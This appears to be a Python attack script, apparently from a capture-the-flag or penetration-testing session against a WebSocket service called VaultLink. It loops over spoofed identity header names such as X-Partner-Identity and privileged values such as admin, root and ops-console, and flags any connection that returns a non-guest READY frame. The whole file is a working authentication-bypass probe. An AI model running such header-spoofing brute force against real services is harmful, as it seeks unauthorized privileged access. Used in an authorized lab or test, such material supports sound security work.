import time, select
from ws import connect, recv_frame
vals=["ops-console","operations-console","console","ops.console","admin-console","vaultlink-ops",
"ops@vaultlink","OPERATIONS","Ops","ADMIN","superuser","service","system","master","superadmin",
"operations","internal","root","admin","ops","vaultlink","relay-ops","core","ledger-admin"]
names=["X-Partner-Identity","X-Partner","X-VaultLink-Identity","X-Identity","X-Partner-Id"]
def trial(hdrs):
    try:
        s,resp=connect(extra_headers=hdrs); s.setblocking(False)
        out=[]; end=time.time()+0.55
        while time.time()<end:
            r,_,_=select.select([s],[],[],0.06)
            if r:
                try: out.append(recv_frame(s)[1])
                except Exception: break
        s.close(); return out
    except Exception: return None
hit=0
for n in names:
    for v in vals:
        out=trial({n:v})
        rdy=[x for x in out or [] if isinstance(x,bytes) and x.startswith(b"READY")]
        if rdy and rdy[0]!=b"READY guest":
            print("HIT",n,v,rdy,flush=True); hit+=1
print("hits",hit)
